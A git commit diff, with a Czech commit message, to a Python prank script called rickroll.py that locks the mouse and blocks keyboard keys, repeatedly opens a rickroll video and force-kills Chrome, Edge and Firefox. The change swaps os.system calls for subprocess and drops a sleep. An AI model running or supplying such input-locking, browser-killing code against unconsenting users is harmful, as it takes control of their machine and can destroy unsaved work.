d17b4ef0ad470e1b7e66688fcf70062906b15959
Dany8239 <dany.koch.9@gmail.com>
2025-02-16 17:57:04 +0100

    knihovna os nahrazena knihovnami subprocess a sys kvuli optimalizaci

--- rickroll.py
+++ rickroll.py
@@ -1,10 +1,10 @@
 import pyautogui as p
 import time as t
-import os
 import webbrowser as w
 import keyboard
 import threading
-
+import subprocess as sp
+import sys
 p.FAILSAFE = False
 
 stopKey = "ctrl+d"  # Hotkey, který zastaví script
@@ -17,21 +17,19 @@ def lock_input():
         p.moveTo(maxX / 2, maxY / 2)  # Zamčení kurzoru
         for i in range(150):  
             keyboard.block_key(i)  # Zamčení klávesnice
-        t.sleep(0.1)  # Menší pauza kvůli vytížení CPU
 
 def rickroll():
     global stop_flag
     while not stop_flag:
         w.open("https://www.youtube.com/watch?v=iik25wqIuFo")
         t.sleep(4)  # Pauza pro načtení Youtube
-
         p.click()
         t.sleep(7) # Celkem 11 sekund wait
 
         # Zavření běžných prohlížečů
-        os.system("taskkill /im chrome.exe /f")
-        os.system("taskkill /im msedge.exe /f")
-        os.system("taskkill /im firefox.exe /f")
+        sp.run(["taskkill", "/im", "chrome.exe", "/f"])
+        sp.run(["taskkill", "/im", "msedge.exe", "/f"])
+        sp.run(["taskkill", "/im", "firefox.exe", "/f"])
 
 def stop_script():
     global stop_flag
@@ -39,7 +37,7 @@ def stop_script():
         if keyboard.is_pressed(stopKey):
             print("Zastavuji script...")
             stop_flag = True
-            os._exit(0)
+            sys.exit()
 
 threading.Thread(target=lock_input, daemon=True).start()
 threading.Thread(target=rickroll, daemon=True).start()
